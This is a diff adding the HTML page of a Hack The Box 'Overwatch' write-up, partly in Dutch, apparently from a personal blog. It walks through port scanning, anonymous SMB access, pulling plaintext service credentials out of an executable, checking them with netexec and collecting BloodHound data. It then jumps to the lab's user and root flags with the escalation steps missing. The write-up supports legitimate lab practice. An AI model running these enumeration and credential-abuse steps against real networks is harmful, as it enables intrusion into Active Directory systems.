@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Overwatch] └─$ nmap 10.129.244.81 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-26 13:06 CET Nmap scan report for 10.129.244.81 Host is up (0.028s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server 5985/tcp open wsman Detailed port scan At the detailed port scan go to get more information from the host.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/writeup-overwatch/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Overwatch] └─$ nmap 10.129.244.81 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-26 13:06 CET Nmap scan report for 10.129.244.81 Host is up (0.028s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server 5985/tcp open wsman Detailed port scan At the detailed port scan go to get more information from the host.">
+  <meta itemprop="wordCount" content="845">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Overwatch] └─$ nmap 10.129.244.81 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-26 13:06 CET Nmap scan report for 10.129.244.81 Host is up (0.028s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server 5985/tcp open wsman Detailed port scan At the detailed port scan go to get more information from the host.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/writeup-overwatch/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Overwatch]
+└─$ nmap 10.129.244.81                                                      
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-26 13:06 CET
+Nmap scan report for 10.129.244.81
+Host is up (0.028s latency).
+Not shown: 987 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the detailed port scan go to get more information from the host.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Overwatch]
+└─$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985 -sCV  10.129.244.81
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-26 13:07 CET
+Nmap scan report for 10.129.244.81
+Host is up (0.059s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-26 12:08:01Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2026-01-26T12:08:06
+|_  start_date: N/A
+|_clock-skew: -1s
+</code></pre><p>Ik kan zien dat er een smb poort openstaat. We hebben geen credentials gekregen, dus zal ik een scan gaan doen op de smb server door gebruik te maken van de anonymous user. Zoals je hieronder zult kunnen zien heb ik lees rechten op de IPC en de Software disk.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Overwatch]
+└─$ smbmap -H 10.129.244.81 -u anonymous                                                                             
+[+] IP: 10.129.244.81:445       Name: overwatch.htb             Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                NO ACCESS       Logon server share 
+        software$                                               READ ONLY
+        SYSVOL                                                  NO ACCESS       Logon server share 
+</code></pre><p>Ik zal als eerst gaan kijken op de software disk. Misshien dat er meer informatie daarop te vinden is.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Overwatch]
+└─$ smbclient \\\\overwatch.htb\\software$ -U anonymous
+</code></pre><p>Ik ben door gebruik te maken de volgende commando&rsquo;s de volledige directory van de smb server gaan halen en gaan zetten naar mijn eigen computer.</p>
+<pre tabindex="0"><code>smb: \&gt; prompt OFF
+smb: \&gt; recurse ON
+smb: \&gt; mget Monitoring
+Get directory Monitoring? yes
+</code></pre><p>Als je het goed gedaan hebt dan zou je het volgende op u eigen machine moeten kunnen zien.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Overwatch]
+└─$ ls Monitoring                    
+EntityFramework.dll                      overwatch.exe.config         System.Management.Automation.dll
+EntityFramework.SqlServer.dll            overwatch.pdb                System.Management.Automation.xml
+EntityFramework.SqlServer.xml            System.Data.SQLite.dll       x64
+EntityFramework.xml                      System.Data.SQLite.EF6.dll   x86
+Microsoft.Management.Infrastructure.dll  System.Data.SQLite.Linq.dll
+overwatch.exe                            System.Data.SQLite.xml
+</code></pre><p>Zoals je hierboven kunt zien zijn er veel interessante zaken die je kan gebruiken. Ik ben als eerst gaan zoeken in de Monitoring Directory of er geen username en password gekent is in de files en zoals je zelf zal kunnen zien is er geen informatie dat gevonden wordt. Ik ben dus gaan kijken naar het .exe bestand en als je daar naar zal kijken zal je kunnen zien dat er een username en een password gevonden wordt.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Overwatch/Monitoring]
+└─$ cat overwatch.exe  
+Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv
+</code></pre><p>Nu dat ik de user credentials heb, ben ik eerst gaan kijken of dat ik met deze user de gegevens van de ldap server kan gaan halen en of ik met deze user ook kan inloggen op de smb server. Zoals je hieronder kan zien heeft deze user toegang tot beide.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Overwatch/Monitoring]
+└─$ netexec ldap overwatch.htb -u &#39;sqlsvc&#39; -p &#39;TI0LKcfHzZw1Vv&#39;                      
+LDAP        10.129.244.81   389    S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb)
+LDAP        10.129.244.81   389    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv 
+
+┌──(kali㉿kali)-[~/HTB/Overwatch/Monitoring]
+└─$ netexec smb overwatch.htb -u &#39;sqlsvc&#39; -p &#39;TI0LKcfHzZw1Vv&#39; --shares 
+SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:False)
+SMB         10.129.244.81   445    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv 
+SMB         10.129.244.81   445    S200401          [*] Enumerated shares
+SMB         10.129.244.81   445    S200401          Share           Permissions     Remark
+SMB         10.129.244.81   445    S200401          -----           -----------     ------
+SMB         10.129.244.81   445    S200401          ADMIN$                          Remote Admin
+SMB         10.129.244.81   445    S200401          C$                              Default share
+SMB         10.129.244.81   445    S200401          IPC$            READ            Remote IPC
+SMB         10.129.244.81   445    S200401          NETLOGON        READ            Logon server share 
+SMB         10.129.244.81   445    S200401          software$       READ            
+SMB         10.129.244.81   445    S200401          SYSVOL          READ            Logon server share 
+</code></pre><p>Ik zal dus als eerst nu de gegevens van de ldap server gaan afhalen en de zip file naar mijn gekozen directory gaan kopieren.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Overwatch]
+└─$ nxc ldap 10.129.244.81 -u &#39;sqlsvc&#39; -p &#39;TI0LKcfHzZw1Vv&#39; --bloodhound --collection All --dns-server 10.129.244.81
+LDAP        10.129.244.81   389    S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb)
+LDAP        10.129.244.81   389    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv 
+LDAP        10.129.244.81   389    S200401          Resolved collection methods: container, localadmin, acl, rdp, objectprops, session, psremote, trusts, dcom, group                                                                   
+LDAP        10.129.244.81   389    S200401          Done in 00M 07S
+LDAP        10.129.244.81   389    S200401          Compressing output into /home/kali/.nxc/logs/S200401_10.129.244.81_2026-01-26_132632_bloodhound.zip  
+
+┌──(kali㉿kali)-[~/HTB/Overwatch/Monitoring]
+└─$ cp /home/kali/.nxc/logs/S200401_10.129.244.81_2026-01-26_132632_bloodhound.zip ../
+</code></pre><p>User Flag</p>
+<pre tabindex="0"><code>*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop&gt; cat user.txt
+280dd7215a375f72e73caf3e7b71becd
+</code></pre><p>Root Flag</p>
+<pre tabindex="0"><code>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
+f3cb2b7297f5783022a0cbb27f0d71d1
+</code></pre><p>![[Pasted image 20260126162441.png]]</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
